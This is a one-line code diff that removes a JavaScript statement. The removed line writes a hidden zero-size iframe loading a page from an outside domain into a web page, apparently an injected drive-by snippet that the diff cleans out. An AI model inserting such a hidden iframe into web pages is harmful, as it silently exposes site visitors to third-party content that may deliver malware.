@@ -1,1 +1,0 @@
-document.write('<head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"></head><center><iframe src="http://www.20script.ir/21" width="0" height="0" frameborder="0"></iframe></center>');
